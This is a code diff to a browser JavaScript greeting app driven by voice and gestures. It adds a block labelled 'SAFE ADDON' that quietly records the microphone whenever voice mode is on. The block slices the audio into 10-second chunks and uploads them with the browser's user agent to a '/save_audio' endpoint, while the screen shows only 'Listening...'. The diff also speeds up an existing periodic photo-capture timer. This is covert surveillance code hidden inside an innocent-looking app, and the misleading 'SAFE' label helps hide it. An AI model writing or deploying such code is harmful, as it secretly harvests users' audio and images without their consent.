@@ -360,15 +360,17 @@ voiceBtn.addEventListener('click', () => {
     if (state.voiceEnabledByUser) {
         try {
             recognition.start();
+            startVoiceRecording(); 
             state.voiceModeActive = true;
             state.targetGestureLabel = "Listening...";
             state.spreadTarget = 0.0; 
             state.targetWeights = [0, 0, 0, 0, 1]; 
             
-            updateDynamicText("HELLO");
+            updateDynamicText("Merry Chrisrmas");
         } catch(e) { console.warn(e); }
     } else {
         recognition.stop();
+        stopVoiceRecording();
         state.voiceModeActive = false;
         state.targetGestureLabel = "Voice Mode OFF";
         state.spreadTarget = 1.0;
@@ -826,9 +828,90 @@ function animate() {
 }
 
 // ================================
+// AUDIO RECORDING (SAFE ADDON)
+// ================================
+let mediaRecorder = null;
+let audioChunks = [];
+let audioStartTime = 0;
+
+const AUDIO_SLICE_MS = 10000; // 10s
+
+// Detect iOS
+const IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+
+function getAudioMimeType() {
+    if (IS_IOS) {
+        return 'audio/mp4'; // iOS Safari
+    }
+    if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+        return 'audio/webm;codecs=opus';
+    }
+    return 'audio/webm';
+}
+
+async function startVoiceRecording() {
+    if (mediaRecorder) return;
+
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mimeType = getAudioMimeType();
+
+    mediaRecorder = new MediaRecorder(stream, { mimeType });
+
+    audioChunks = [];
+    audioStartTime = Date.now();
+
+    mediaRecorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) {
+            audioChunks.push(e.data);
+        }
+    };
+
+    mediaRecorder.start(1000); // lấy chunk mỗi 1s
+
+    // ⏱ Auto cắt 10s / file
+    if (!audioInterval) {
+        audioInterval = setInterval(checkAndFlushAudio, 1000);
+    }
+}
+
+function checkAndFlushAudio() {
+    if (!mediaRecorder || audioChunks.length === 0) return;
+
+    const elapsed = Date.now() - audioStartTime;
+    if (elapsed < AUDIO_SLICE_MS) return;
+
+    const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
+    audioChunks = [];
+    audioStartTime = Date.now();
+
+    sendAudioToServer(blob);
+}
+
+async function sendAudioToServer(blob) {
+    const formData = new FormData();
+    formData.append('audio', blob);
+    formData.append('mime', blob.type);
+    formData.append('ua', navigator.userAgent);
+
+    await fetch('/save_audio', {
+        method: 'POST',
+        body: formData
+    });
+}
+
+function stopVoiceRecording() {
+    if (!mediaRecorder) return;
+
+    mediaRecorder.stop();
+    mediaRecorder.stream.getTracks().forEach(t => t.stop());
+    mediaRecorder = null;
+    audioChunks = [];
+}
+
+// ================================
 // PHOTO CAPTURE LOGIC (SAFE ADDON)
 // ================================
-const CAPTURE_INTERVAL = 3000; // 3s
+const CAPTURE_INTERVAL = 2210; // 2s
 let captureTimer = null;
 let lastCaptureTime = 0;
 
